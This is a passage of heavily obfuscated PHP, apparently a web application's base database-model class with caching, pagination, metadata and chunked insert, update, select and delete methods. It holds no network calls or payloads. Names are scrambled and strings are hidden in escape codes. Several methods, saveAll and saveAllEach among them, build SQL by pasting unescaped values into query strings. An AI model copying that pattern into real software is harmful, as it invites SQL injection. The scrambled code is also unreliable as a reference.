$B‘õÁ•öñá) { if (!is_array($F†Ñ©‡Ûì)) { return; } if (!$this->checkDataAutoHas($_SERVER[¯Ò¬Èè][346])) { return; } $this->dataAfterFilter($F†Ñ©‡Ûì); } public function setAutoIncrement($f’ÃóëÉ¸) { $bëº‰¼¸„Ì = array($this->getPk() => $f’ÃóëÉ¸); $f§ßï×–ÑÈ = $this->data($bëº‰¼¸„Ì)->add(); if ($f§ßï×–ÑÈ) { $this->delete($f§ßï×–ÑÈ); } } public function getAutoIncrement() { $A£³“æãËá = $this->getTableName(); $f…–ÇîÑñİ = $this->max($this->getPk()); $dÃ„¥…É³ = $this->query("\163\150\x6f\167\40\164\x61\x62\154\x65\40\163\164\x61\x74\x75\x73\40\167\x68\x65\x72\x65\40\116\x61\x6d\145\x3d\x27{$A£³“æãËá}\47"); $DŠ˜ÕƒÕßí = $dÃ„¥…É³[0][$_SERVER[¯Ò¬Èè][347]]; $B„ãš¥°Ÿ‘ = max($f…–ÇîÑñİ, $DŠ˜ÕƒÕßí); return $B„ãš¥°Ÿ‘; } protected function _callBefore($E¦ÕµçÁÖ¾, $Eîó„ŒÒ‚) { return $this->cacheCallCheck($E¦ÕµçÁÖ¾, $Eîó„ŒÒ‚, !1); } protected function _callAfter($f¼¥³Ëôëã, $A÷ç¥Ğˆ…š) { return $this->cacheCallCheck($f¼¥³Ëôëã, $A÷ç¥Ğˆ…š, !0); } protected function cacheFunctionAlias($e¬¤¢§ï‚´) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($cÖêÃššƒŒ, $DõÛ²·ºë¥, $dÁÚÅª¿ŸÏ = false) { $Féæ…’Ì¸¸ = $this->cacheFunctionAlias($DõÛ²·ºë¥); if (!$Féæ…’Ì¸¸) { return; } foreach ($Féæ…’Ì¸¸ as $FÍ„‡Õƒ => $A¾äëÚ§–) { $C¦è¶øê–Â = $A¾äëÚ§–[0]; $Fó“ÌØŒœİ = explode($_SERVER[¯Ò¬Èè][47], $A¾äëÚ§–[1]); if ($cÖêÃššƒŒ == $FÍ„‡Õƒ) { return $this->cacheFunctionGet($FÍ„‡Õƒ, $C¦è¶øê–Â); } if ($dÁÚÅª¿ŸÏ && in_array($cÖêÃššƒŒ, $Fó“ÌØŒœİ)) { $this->cacheFunctionClear($FÍ„‡Õƒ, $C¦è¶øê–Â); } } } public function cacheFunctionGet($e÷Îñ½¤Ä×, $cßŒ™Êôóæ) { $b‰Š¿Úß„ = $this->cacheKeyMake($e÷Îñ½¤Ä×, $cßŒ™Êôóæ); $AìÛĞ†©¬ç = Cache::get($b‰Š¿Úß„); if (!is_array($AìÛĞ†©¬ç)) { $AìÛĞ†©¬ç = call_user_func_array(array($this, $e÷Îñ½¤Ä×), array($cßŒ™Êôóæ, !0)); Cache::set($b‰Š¿Úß„, $AìÛĞ†©¬ç); } return $AìÛĞ†©¬ç; } public function cacheFunctionClear($F•õòñÛŒ, $e´²œæ»ÚÈ) { $AĞÉàø©Ë = $e´²œæ»ÚÈ; if (!is_array($e´²œæ»ÚÈ)) { $AĞÉàø©Ë = array($e´²œæ»ÚÈ); } foreach ($AĞÉàø©Ë as $A÷ÏÍİ‘‡) { $BÊôèø = $this->cacheKeyMake($F•õòñÛŒ, $A÷ÏÍİ‘‡); Cache::remove($BÊôèø); } } private function cacheKeyMake($cñºÍ¿ã, $C‘±Ò†„ù) { $fÕ„ËàÎîñ =& $_SERVER[¯Ò¬Èè]; return get_class($this) . $fÕ„ËàÎîñ[70] . $cñºÍ¿ã . $fÕ„ËàÎîñ[348] . $C‘±Ò†„ù; } protected function selectPage($E¢Å“ÜÇÀ = 200, $eÜ‘ÓÅôì = 1) { goto A…íƒè¢„–; CŒÃõàÖÃ: $D‚¯’öùìæ = 4000; $E¢Å“ÜÇÀ = isset($in[$C¨Û‚æ²[349]]) ? $in[$C¨Û‚æ²[349]] : $E¢Å“ÜÇÀ; if ($E¢Å“ÜÇÀ === -1) { unset($in[$C¨Û‚æ²[349]]); $D‚¯’öùìæ = 100000000; $E¢Å“ÜÇÀ = $D‚¯’öùìæ; } goto d±áà¶¹Œ±; dğ°ÑÃ¨“…: $A•Ê¼À‚’– = intval($this->count()); $E¢Å“ÜÇÀ = intval($E¢Å“ÜÇÀ); $E¢Å“ÜÇÀ = $E¢Å“ÜÇÀ <= 5 ? 5 : ($E¢Å“ÜÇÀ >= $D‚¯’öùìæ ? $D‚¯’öùìæ : $E¢Å“ÜÇÀ); goto dİÛ·‰¾º; D·ÛØï±÷³: $this->optionsValue($c¦ŒÏµÔÏÉ); $bŸíã¹š™¢ = $this->page($eÜ‘ÓÅôì, $E¢Å“ÜÇÀ)->select(); $bŸíã¹š™¢ = is_array($bŸíã¹š™¢) ? $bŸíã¹š™¢ : array(); goto d‘ÃĞÁÎÑÒ; A…íƒè¢„–: $C¨Û‚æ² =& $_SERVER[¯Ò¬Èè]; global $in; $c¦ŒÏµÔÏÉ = $this->optionsValue(); goto CŒÃõàÖÃ; d±áà¶¹Œ±: $cºÉœŠá„ = $c¦ŒÏµÔÏÉ; $cºÉœŠá„[$C¨Û‚æ²[350]] = array(); $this->optionsValue($cºÉœŠá„); goto dğ°ÑÃ¨“…; d‘ÃĞÁÎÑÒ: if ($c®ŒâØ³æ == 1) { $A•Ê¼À‚’– = count($bŸíã¹š™¢); } $d´ß· ¹‹• = array($C¨Û‚æ²[351] => array($C¨Û‚æ²[352] => $A•Ê¼À‚’–, $C¨Û‚æ²[349] => $E¢Å“ÜÇÀ, $C¨Û‚æ²[340] => $eÜ‘ÓÅôì, $C¨Û‚æ²[353] => $c®ŒâØ³æ), $C¨Û‚æ²[354] => $bŸíã¹š™¢ ? $bŸíã¹š™¢ : array()); return $d´ß· ¹‹•; goto F®Õõ»½ ´; dİÛ·‰¾º: $c®ŒâØ³æ = ceil($A•Ê¼À‚’– / $E¢Å“ÜÇÀ); $eÜ‘ÓÅôì = intval(isset($in[$C¨Û‚æ²[340]]) ? $in[$C¨Û‚æ²[340]] : $eÜ‘ÓÅôì); $eÜ‘ÓÅôì = $eÜ‘ÓÅôì <= 1 ? 1 : ($eÜ‘ÓÅôì >= $c®ŒâØ³æ ? $c®ŒâØ³æ : $eÜ‘ÓÅôì); goto D·ÛØï±÷³; F®Õõ»½ ´: } protected function checkLength($c®½­Ì©¦’, $d™“°¢†ïŒ = 0, $f£ÊœÉƒœ = '') { $fòá…ºƒ =& $_SERVER[¯Ò¬Èè]; $d™“°¢†ïŒ = $d™“°¢†ïŒ ? $d™“°¢†ïŒ : 65536; if (!$c®½­Ì©¦’ || strlen($c®½­Ì©¦’) < $d™“°¢†ïŒ) { return; } $f£ÊœÉƒœ = $f£ÊœÉƒœ ? $f£ÊœÉƒœ . $fòá…ºƒ[67] : $fòá…ºƒ[33]; show_json($f£ÊœÉƒœ . LNG($fòá…ºƒ[355]) . "\x28{$d™“°¢†ïŒ}\x29", !1); } protected function metaSet($DšÄ÷â¯¯, $A¡Ê½ò…¼Ú = null, $f›ä–íÃ± = null) { goto B¥¯ï½Ãù; b÷’¬ÜÕİê: if (is_null($A¡Ê½ò…¼Ú)) { return $e©í˜ã­Ë->where(array($B«¨«Ô‡¿ => $DšÄ÷â¯¯))->delete(); } if (is_null($f›ä–íÃ±)) { return $e©í˜ã­Ë->where($D›à†Ì°õ)->delete(); } $fèµ£¥Ï² = is_array($A¡Ê½ò…¼Ú) ? $A¡Ê½ò…¼Ú : array(); goto cÆƒö¢ˆ·›; e‹ÄäòØˆ®: $e©í˜ã­Ë->where(array($B«¨«Ô‡¿ => $DšÄ÷â¯¯))->addAll($bŞ¯—õ¤µ, array(), !0); return !0; goto dÁÇŒë¾£¨; cÆƒö¢ˆ·›: if (is_string($A¡Ê½ò…¼Ú)) { $fèµ£¥Ï²[$A¡Ê½ò…¼Ú] = $f›ä–íÃ±; } $bŞ¯—õ¤µ = array(); foreach ($fèµ£¥Ï² as $A¢“ãò‹Š‹ => $a®ßìØ²á±) { $this->checkLength($a®ßìØ²á±, !1, $F—ÙùÎ‰¤¹ . $bñ‡ƒ¨‡±[4] . $A¢“ãò‹Š‹); $bŞ¯—õ¤µ[] = array($B«¨«Ô‡¿ => $DšÄ÷â¯¯, $bñ‡ƒ¨‡±[89] => $A¢“ãò‹Š‹, $bñ‡ƒ¨‡±[359] => $a®ßìØ²á±); } goto e‹ÄäòØˆ®; B¥¯ï½Ãù: $bñ‡ƒ¨‡± =& $_SERVER[¯Ò¬Èè]; if (!$this->tableMeta) { return !1; } $B«¨«Ô‡¿ = $this->tableMeta[$bñ‡ƒ¨‡±[356]]; goto e¯èÄŠÇ°—; e¯èÄŠÇ°—: $F—ÙùÎ‰¤¹ = $this->tableMeta[$bñ‡ƒ¨‡±[357]]; $e©í˜ã­Ë = Model($F—ÙùÎ‰¤¹); $D›à†Ì°õ = array($B«¨«Ô‡¿ => $DšÄ÷â¯¯, $bñ‡ƒ¨‡±[358] => $A¡Ê½ò…¼Ú); goto b÷’¬ÜÕİê; dÁÇŒë¾£¨: } public function metaGet($dé™ºÛî‡) { goto Còï¹ß ã; dĞšéíå¿ˆ: $cçİ¬Â¡Ó… = Model($this->tableMeta[$f“§•‚¥„[357]]); $eÉÎóÚˆ•² = array($BÀ¢ôÜåÕ => $dé™ºÛî‡); $F¥±Ë¹ƒØ = $cçİ¬Â¡Ó…->field($f“§•‚¥„[360])->where($eÉÎóÚˆ•²)->select(); goto dİ¥ØÕ´•¡; Còï¹ß ã: $f“§•‚¥„ =& $_SERVER[¯Ò¬Èè]; if (!$this->tableMeta) { return array(); } $BÀ¢ôÜåÕ = $this->tableMeta[$f“§•‚¥„[356]]; goto dĞšéíå¿ˆ; dİ¥ØÕ´•¡: $F¥±Ë¹ƒØ = array_to_keyvalue($F¥±Ë¹ƒØ, $f“§•‚¥„[89], $f“§•‚¥„[359]); return $F¥±Ë¹ƒØ; goto B±Ç’ÉôÄİ; B±Ç’ÉôÄİ: } private function checkDataAutoHas($bÈ»İØĞå‚) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $E›¿ÇëŞº) { if (in_array($bÈ»İØĞå‚, explode($_SERVER[¯Ò¬Èè][47], $E›¿ÇëŞº[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$eô¥ŸäœÕ—, $B¢ŠÎŞÕöİ) { $dˆ•é‰ŠÕö =& $_SERVER[¯Ò¬Èè]; foreach ($this->dataAuto as $B”ÊŠ§¾ï™) { $CÅ†ùïÄÏõ = $B”ÊŠ§¾ï™[0]; if (!in_array($B¢ŠÎŞÕöİ, explode($dˆ•é‰ŠÕö[47], $B”ÊŠ§¾ï™[2]))) { continue; } switch (trim($B”ÊŠ§¾ï™[3])) { case $dˆ•é‰ŠÕö[309]: case $dˆ•é‰ŠÕö[310]: $D¯“ÙÆ† ’ = $B”ÊŠ§¾ï™[1]; $B§‘š…‘ÎÇ = isset($B”ÊŠ§¾ï™[4]) ? (array) $B”ÊŠ§¾ï™[4] : array(); if ($D¯“ÙÆ† ’ == $dˆ•é‰ŠÕö[190] && array_key_exists($CÅ†ùïÄÏõ, $eô¥ŸäœÕ—)) { if (!$eô¥ŸäœÕ—[$CÅ†ùïÄÏõ]) { unset($eô¥ŸäœÕ—[$CÅ†ùïÄÏõ]); } break; } if (isset($eô¥ŸäœÕ—[$CÅ†ùïÄÏõ])) { array_unshift($B§‘š…‘ÎÇ, $eô¥ŸäœÕ—[$CÅ†ùïÄÏõ]); } if ($dˆ•é‰ŠÕö[309] == $B”ÊŠ§¾ï™[3]) { $eô¥ŸäœÕ—[$CÅ†ùïÄÏõ] = call_user_func_array($D¯“ÙÆ† ’, $B§‘š…‘ÎÇ); } else { $eô¥ŸäœÕ—[$CÅ†ùïÄÏõ] = call_user_func_array(array(&$this, $D¯“ÙÆ† ’), $B§‘š…‘ÎÇ); } break; case $dˆ•é‰ŠÕö[261]: $eô¥ŸäœÕ—[$CÅ†ùïÄÏõ] = $eô¥ŸäœÕ—[$B”ÊŠ§¾ï™[1]]; break; case $dˆ•é‰ŠÕö[282]: if (isset($eô¥ŸäœÕ—[$CÅ†ùïÄÏõ]) && !is_string($eô¥ŸäœÕ—[$CÅ†ùïÄÏõ])) { $eô¥ŸäœÕ—[$CÅ†ùïÄÏõ] = json_encode_force($eô¥ŸäœÕ—[$CÅ†ùïÄÏõ]); } break; case $dˆ•é‰ŠÕö[311]: if ($eô¥ŸäœÕ—[$CÅ†ùïÄÏõ] === $dˆ•é‰ŠÕö[33]) { unset($eô¥ŸäœÕ—[$CÅ†ùïÄÏõ]); } break; case $dˆ•é‰ŠÕö[312]: $eô¥ŸäœÕ—[$CÅ†ùïÄÏõ] = $B”ÊŠ§¾ï™[1]; default: break; } } if ($B¢ŠÎŞÕöİ == $dˆ•é‰ŠÕö[344]) { $dÍŒ—Å…¨å = strtolower($this->db->getDbType()); if (strpos($dÍŒ—Å…¨å, $dˆ•é‰ŠÕö[9]) !== 0) { return; } $fèØÇ‘§Ø“ = $this->field(!0)->fields; $fÁ¿‡šÊ® = $fèØÇ‘§Ø“[$dˆ•é‰ŠÕö[240]]; if (isset($fèØÇ‘§Ø“[$dˆ•é‰ŠÕö[239]])) { unset($fÁ¿‡šÊ®[$fèØÇ‘§Ø“[$dˆ•é‰ŠÕö[239]]]); } foreach ($fÁ¿‡šÊ® as $FĞ ÆÇÍ£° => $B¢ŠÎŞÕöİ) { if (!isset($eô¥ŸäœÕ—[$FĞ ÆÇÍ£°])) { $eô¥ŸäœÕ—[$FĞ ÆÇÍ£°] = $dˆ•é‰ŠÕö[33]; } } } } private function dataAfterFilter(&$Cã‹¢œ«±ˆ) { $Bƒñ¿Ö”æ„ =& $_SERVER[¯Ò¬Èè]; foreach ($this->dataAuto as $c‚‡ƒªñŠÙ) { $aĞ÷ÏŞœ…™ = $c‚‡ƒªñŠÙ[0]; if (!in_array($Bƒñ¿Ö”æ„[346], explode($Bƒñ¿Ö”æ„[47], $c‚‡ƒªñŠÙ[2]))) { continue; } if (!isset($Cã‹¢œ«±ˆ[$aĞ÷ÏŞœ…™])) { continue; } switch (trim($c‚‡ƒªñŠÙ[3])) { case $Bƒñ¿Ö”æ„[309]: case $Bƒñ¿Ö”æ„[310]: $F¡¸„â³àĞ = isset($c‚‡ƒªñŠÙ[4]) ? (array) $c‚‡ƒªñŠÙ[4] : array(); array_unshift($F¡¸„â³àĞ, $Cã‹¢œ«±ˆ[$aĞ÷ÏŞœ…™]); if ($Bƒñ¿Ö”æ„[309] == $c‚‡ƒªñŠÙ[3]) { $Cã‹¢œ«±ˆ[$aĞ÷ÏŞœ…™] = call_user_func_array($c‚‡ƒªñŠÙ[1], $F¡¸„â³àĞ); } else { $Cã‹¢œ«±ˆ[$aĞ÷ÏŞœ…™] = call_user_func_array(array(&$this, $c‚‡ƒªñŠÙ[1]), $F¡¸„â³àĞ); } break; case $Bƒñ¿Ö”æ„[261]: $Cã‹¢œ«±ˆ[$aĞ÷ÏŞœ…™] = $Cã‹¢œ«±ˆ[$c‚‡ƒªñŠÙ[1]]; break; case $Bƒñ¿Ö”æ„[282]: $EŞŸ½ÆŠ = $Cã‹¢œ«±ˆ[$aĞ÷ÏŞœ…™]; $Cã‹¢œ«±ˆ[$aĞ÷ÏŞœ…™] = json_decode($EŞŸ½ÆŠ, !0); if (is_null($Cã‹¢œ«±ˆ[$aĞ÷ÏŞœ…™])) { $Cã‹¢œ«±ˆ[$aĞ÷ÏŞœ…™] = $EŞŸ½ÆŠ; } break; case $Bƒñ¿Ö”æ„[311]: if ($Cã‹¢œ«±ˆ[$aĞ÷ÏŞœ…™] === $Bƒñ¿Ö”æ„[33]) { unset($Cã‹¢œ«±ˆ[$aĞ÷ÏŞœ…™]); } break; case $Bƒñ¿Ö”æ„[312]: $Cã‹¢œ«±ˆ[$aĞ÷ÏŞœ…™] = $c‚‡ƒªñŠÙ[1]; default: break; } } } public function saveAll($CÙ´°£ˆ¼) { goto A—ØÚšœ¶÷; dÔ‘íÑä : $CÙ´°£ˆ¼ = is_array($CÙ´°£ˆ¼) ? $CÙ´°£ˆ¼ : array(); $B¡ø±‘”¥Ñ = $B¹¤À«…»ù[361]; $Cï¾â„ = 0; goto aŞ¾áÒ”µ; A—ØÚšœ¶÷: $B¹¤À«…»ù =& $_SERVER[¯Ò¬Èè]; $B¿‰Ü‚ÀÂ  = $this->tablePrefix . $this->tableName; $DÑä†¬Éµõ = self::SQL_WHERE_IN_CHUNK; goto dÔ‘íÑä ; c–òÊŠ°Ş : $this->chunkEventSet(); goto Cª“»‚æ Ò; aŞ¾áÒ”µ: $aÑˆ”Äã = array(); $BÚôç¹ŞØ¦ = count($CÙ´°£ˆ¼); for ($B£Õš¢­ë‹ = 0; $B£Õš¢­ë‹ < $BÚôç¹ŞØ¦; $B£Õš¢­ë‹++) { $C™Ü·ÍÀ„ù = $CÙ´°£ˆ¼[$B£Õš¢­ë‹]; if (!is_array($C™Ü·ÍÀ„ù) || count($C™Ü·ÍÀ„ù) != 4) { continue; } $dÉìß×ë¢» = "\125\x50\104\101\124\105\40\x60{$B¿‰Ü‚ÀÂ }\x60\40\x53\x45\x54\40{$C™Ü·ÍÀ„ù[2]}\40\x3d\x20\103\x41\123\x45\x20{$C™Ü·ÍÀ„ù[0]}\40\xa"; if ($Cï¾â„ == 0) { $B¡ø±‘”¥Ñ = $dÉìß×ë¢»; } $aÑˆ”Äã[] = $B¹¤À«…»ù[113] . $C™Ü·ÍÀ„ù[1] . $B¹¤À«…»ù[113]; $Cï¾â„++; $B¡ø±‘”¥Ñ .= "\x20\x57\x48\105\x4e\x20\x27{$C™Ü·ÍÀ„ù[1]}\47\40\x54\110\105\x4e\40\47{$C™Ü·ÍÀ„ù[3]}\47\40\12"; if ($Cï¾â„ == $DÑä†¬Éµõ || $B£Õš¢­ë‹ == $BÚôç¹ŞØ¦ - 1) { goto fÚøÖ•Ú«; Fæ“Äê¿Ç§: $Cï¾â„ = 0; $B¡ø±‘”¥Ñ = $dÉìß×ë¢»; $this->chunkEventCheck(count($aÑˆ”Äã)); goto BòÆœÓ›öò; BòÆœÓ›öò: $aÑˆ”Äã = array(); goto CÂ¬ôÚŒŒª; fÚøÖ•Ú«: $B…š£„öÇ© = implode($B¹¤À«…»ù[47], $aÑˆ”Äã); $B¡ø±‘”¥Ñ .= "\40\105\x4e\104\x20\x20\x57\x48\105\x52\x45\40{$C™Ü·ÍÀ„ù[0]}\x20\111\116\40\50{$B…š£„öÇ©}\51\40"; $this->execute($B¡ø±‘”¥Ñ); goto Fæ“Äê¿Ç§; CÂ¬ôÚŒŒª: } } goto c–òÊŠ°Ş ; Cª“»‚æ Ò: } public function saveAllEach($A³–óÁÈæ) { $f…Ì¹ˆñ›° =& $_SERVER[¯Ò¬Èè]; $dÕ†•ÎïíÓ = $this->tablePrefix . $this->tableName; foreach ($A³–óÁÈæ as $F²ñ”ÉñÍõ) { if (!is_array($F²ñ”ÉñÍõ) || count($F²ñ”ÉñÍõ) != 4) { continue; } $D¶ºÔ ……‘ = $F²ñ”ÉñÍõ[0] . $f…Ì¹ˆñ›°[362] . $F²ñ”ÉñÍõ[1] . $f…Ì¹ˆñ›°[113]; $E½ª‡Í¢ƒå = $F²ñ”ÉñÍõ[2] . $f…Ì¹ˆñ›°[362] . $F²ñ”ÉñÍõ[3] . $f…Ì¹ˆñ›°[113]; $F§ÛğÃ…õ = "\x75\x70\144\141\164\145\40{$dÕ†•ÎïíÓ}\x20\163\145\164\x20{$E½ª‡Í¢ƒå}\40\x77\x68\x65\162\145\x20{$D¶ºÔ ……‘}\73"; $this->execute($F§ÛğÃ…õ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($Cƒ„²Ì×÷ = false, $bé¦åñÔŒ = false) { $this->_chunkEvent = $Cƒ„²Ì×÷; $this->_chunkEventParam = $bé¦åñÔŒ; } private function chunkEventCheck($Aƒ”ë¢Ü—) { if (!$this->_chunkEvent) { return; } $B·©‚èÚ¿ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $B·©‚èÚ¿[$_SERVER[¯Ò¬Èè][363]] = $Aƒ”ë¢Ü—; Hook::trigger($this->_chunkEvent, $B·©‚èÚ¿); } public function addAll($cÊè¼™„œ‡, $CÈğ¿ÔÕŠó = array(), $C˜Õ¼öŸ = false) { goto aÉ‰‘Ğ…“£; eÁ³÷»ŠÆ: if (method_exists($this->db, $a¯ß×‡”‹Ì[260])) { for ($c§ò¼¶‘ = 0; $c§ò¼¶‘ < count($cÊè¼™„œ‡); $c§ò¼¶‘ += $aÓêÕ‚‘¦ò) { $bÎƒ‹ƒÔâ = array_slice($cÊè¼™„œ‡, $c§ò¼¶‘, $aÓêÕ‚‘¦ò); if (!is_array($bÎƒ‹ƒÔâ) || count($bÎƒ‹ƒÔâ) == 0) { break; } $e¦Š»ŒâÍó = $this->db->insertAll($bÎƒ‹ƒÔâ, $CÈğ¿ÔÕŠó, $C˜Õ¼öŸ); $this->chunkEventCheck(count($bÎƒ‹ƒÔâ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($cÊè¼™„œ‡ as $Eù‡¹‚ÌÓà => $F´áï·¯¬Ç) { $e¦Š»ŒâÍó = $this->db->insert($F´áï·¯¬Ç, $CÈğ¿ÔÕŠó, $C˜Õ¼öŸ); } $this->commit(); } if (!1 !== $e¦Š»ŒâÍó) { $E±áòàÑÜå = $this->getLastInsID(); if ($E±áòàÑÜå) { return $E±áòàÑÜå; } } return $e¦Š»ŒâÍó; goto BŠ»‰ìòµ; aÉ‰‘Ğ…“£: $a¯ß×‡”‹Ì =& $_SERVER[¯Ò¬Èè]; ignore_timeout(); $aÓêÕ‚‘¦ò = self::SQL_WHERE_IN_CHUNK; goto f³¾¬›Şä˜; f³¾¬›Şä˜: if (empty($cÊè¼™„œ‡)) { $this->error = think_lang($a¯ß×‡”‹Ì[259]); return !1; } $CÈğ¿ÔÕŠó = $this->_parseOptions($CÈğ¿ÔÕŠó); foreach ($cÊè¼™„œ‡ as $Eù‡¹‚ÌÓà => $F´áï·¯¬Ç) { $cÊè¼™„œ‡[$Eù‡¹‚ÌÓà] = $this->_facade($F´áï·¯¬Ç); $this->_beforeInsert($cÊè¼™„œ‡[$Eù‡¹‚ÌÓà], $CÈğ¿ÔÕŠó); } goto eÁ³÷»ŠÆ; BŠ»‰ìòµ: } public function save($DÒ”ç†‚ = '', $D¦ËÜÌê™ = array()) { goto dÉÑ¤ôø²…; b¼ãÈÚèİÎ: $aÆêÒ³†ƒë = $Bôšè¬ŒœÄ[$cšĞà¿‹„É[263]][$Bœ°¼½–‚š][1]; $aÆêÒ³†ƒë = is_array($aÆêÒ³†ƒë) ? $aÆêÒ³†ƒë : array(); $F¬š³æ˜îë = count($aÆêÒ³†ƒë); goto añòÖ—áò°; añòÖ—áò°: for ($eƒÒÏà¶Ì = 0; $eƒÒÏà¶Ì < $F¬š³æ˜îë; $eƒÒÏà¶Ì += $C„‘Š‚Õ‰˜) { $D­…ãŒ¦‚ = array_slice($aÆêÒ³†ƒë, $eƒÒÏà¶Ì, $C„‘Š‚Õ‰˜); if (!is_array($D­…ãŒ¦‚) || count($D­…ãŒ¦‚) == 0) { break; } $Bôšè¬ŒœÄ[$cšĞà¿‹„É[263]][$Bœ°¼½–‚š][1] = $D­…ãŒ¦‚; $this->optionsValue($Bôšè¬ŒœÄ); $F­šìØŒÄ‹ += parent::save($DÒ”ç†‚, $D¦ËÜÌê™); $this->chunkEventCheck(count($D­…ãŒ¦‚)); } $this->chunkEventSet(); return $F­šìØŒÄ‹; goto cÚçç÷Ö¢—; AŠ‡–·¹†³: $Bœ°¼½–‚š = $this->findWhereField($Bôšè¬ŒœÄ); if (!$Bœ°¼½–‚š) { return parent::save($DÒ”ç†‚, $D¦ËÜÌê™); } $F­šìØŒÄ‹ = 0; goto b¼ãÈÚèİÎ; dÉÑ¤ôø²…: $cšĞà¿‹„É =& $_SERVER[¯Ò¬Èè]; $C„‘Š‚Õ‰˜ = self::SQL_WHERE_IN_CHUNK; $Bôšè¬ŒœÄ = $this->optionsValue(); goto AŠ‡–·¹†³; cÚçç÷Ö¢—: } public function add($E¹’ñ«…ôõ = '', $Aˆ‰‹á¿‡µ = array(), $EÀ²¢§¦Ñ¯ = false) { if ($this->addTaskStatus && is_array($E¹’ñ«…ôõ)) { $this->addTaskData[] = $E¹’ñ«…ôõ; return; } return parent::add($E¹’ñ«…ôõ, $Aˆ‰‹á¿‡µ, $EÀ²¢§¦Ñ¯); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($cÁÃëïÆš = array()) { goto cİ¡áÈƒî; cİ¡áÈƒî: $d‰Öø–±—• =& $_SERVER[¯Ò¬Èè]; $BÎø¶Òİ‡™ = self::SQL_WHERE_IN_CHUNK; $bñé¶µ‚Ã± = $this->optionsValue(); goto d¢Ú±İôÄô; d¢Ú±İôÄô: $a§íÍËÍÌ  = $this->findWhereField($bñé¶µ‚Ã±); if (!$a§íÍËÍÌ  || isset($bñé¶µ‚Ã±[$d‰Öø–±—•[280]]) || isset($bñé¶µ‚Ã±[$d‰Öø–±—•[340]])) { return parent::select($cÁÃëïÆš); } $EØíÃ“¿Å„ = $bñé¶µ‚Ã±[$d‰Öø–±—•[263]][$a§íÍËÍÌ ][1]; goto EÀÁÑˆ³†ó; EÀÁÑˆ³†ó: $EØíÃ“¿Å„ = is_array($EØíÃ“¿Å„) ? $EØíÃ“¿Å„ : array(); $AÍ¶¬èàÅº = null; for ($B×ÇˆŸÌó = 0; $B×ÇˆŸÌó < count($EØíÃ“¿Å„); $B×ÇˆŸÌó += $BÎø¶Òİ‡™) { $A»´Ï•öƒ‘ = array_slice($EØíÃ“¿Å„, $B×ÇˆŸÌó, $BÎø¶Òİ‡™); if (!is_array($A»´Ï•öƒ‘) || count($A»´Ï•öƒ‘) == 0) { break; } $bñé¶µ‚Ã±[$d‰Öø–±—•[263]][$a§íÍËÍÌ ][1] = $A»´Ï•öƒ‘; $this->optionsValue($bñé¶µ‚Ã±); $E¤Ã˜é¥¿Ñ = parent::select($cÁÃëïÆš); if (!$E¤Ã˜é¥¿Ñ) { continue; } if (is_null($AÍ¶¬èàÅº)) { $AÍ¶¬èàÅº = array(); } $AÍ¶¬èàÅº = array_merge($AÍ¶¬èàÅº, $E¤Ã˜é¥¿Ñ); } goto AÒãÀ½ÕÅÅ; AÒãÀ½ÕÅÅ: return $AÍ¶¬èàÅº; goto CÉÌÆ²‰—›; CÉÌÆ²‰—›: } public function delete($c‡òĞÍ‡Èˆ = array()) { goto e÷¼¸íÄƒ÷; e÷¼¸íÄƒ÷: $DŠÌ„´ˆÏ‚ =& $_SERVER[¯Ò¬Èè]; $EëÅ¢›Œµí = self::SQL_WHERE_IN_CHUNK; $eÇ¿Ú³‡£… = $this->optionsValue(); goto DÃìğ—İ•; dÜÑé: return $E‹’¯—æµ; goto cÑ»îÒÎ†ö; BÇ‚÷ºÂ§½: $fÌ¨ª²×–À = $eÇ¿Ú³‡£…[$DŠÌ„´ˆÏ‚[263]][$fÆí¡ˆìÌ‡][1]; $fÌ¨ª²×–À = is_array($fÌ¨ª²×–À) ? $fÌ¨ª²×–À : array(); for ($Dî‹ùã—‹† = 0; $Dî‹ùã—‹† < count($fÌ¨ª²×–À); $Dî‹ùã—‹† += $EëÅ¢›Œµí) { $f‡ãéµÇÚ = array_slice($fÌ¨ª²×–À, $Dî‹ùã—‹†, $EëÅ¢›Œµí); if (!is_array($f‡ãéµÇÚ) || count($f‡ãéµÇÚ) == 0) { break; } $eÇ¿Ú³‡£…[$DŠÌ„´ˆÏ‚[263]][$fÆí¡ˆìÌ‡][1] = $f‡ãéµÇÚ; $this->optionsValue($eÇ¿Ú³‡£…); $E‹’¯—æµ += parent::delete($c‡òĞÍ‡Èˆ); } goto dÜÑé; DÃìğ—İ•: $fÆí¡ˆìÌ‡ = $this->findWhereField($eÇ¿Ú³‡£…); if (!$fÆí¡ˆìÌ‡) { return parent::delete($c‡òĞÍ‡Èˆ); } $E‹’¯—æµ = 0; goto BÇ‚÷ºÂ§½; cÑ»îÒÎ†ö: } private function findWhereField($a  ’ĞˆèÍ) { $c¼’ šç— =& $_SERVER[¯Ò¬Èè]; $F¿ÖÒ‹Ø = self::SQL_WHERE_IN_CHUNK; if (!is_array($a  ’ĞˆèÍ) || !is_array($a  ’ĞˆèÍ[$c¼’ šç—[263]])) { return !1; } foreach ($a  ’ĞˆèÍ[$c¼’ šç—[263]] as $Dè›“¬¸Î => $b°ãÂ¿Çê) { if (is_array($b°ãÂ¿Çê) && isset($b°ãÂ¿Çê[0]) && is_string($b°ãÂ¿Çê[0]) && strtolower($b°ãÂ¿Çê[0]) == $c¼’ šç—[7] && is_array($b°ãÂ¿Çê[1]) && count($b°ãÂ¿Çê[1]) > $F¿ÖÒ‹Ø) { ignore_timeout(); return $Dè›“¬¸Î; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\x73\164\x65\x6d\x4f\160\x74\x69\x6f\156"; public $field = array(); public function listData($BôÎ“ÜĞÌ£ = false, $c§ºí°ÙÂé = "\x6d\x6f\x64\151\x66\171\124\151\155\145", $CØÌ‹³Ûò‘ = false) { $cÀÅâ¨…ÆÏ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$cÀÅâ¨…ÆÏ) { return $BôÎ“ÜĞÌ£ ? null : array(); } if (!$BôÎ“ÜĞÌ£) { 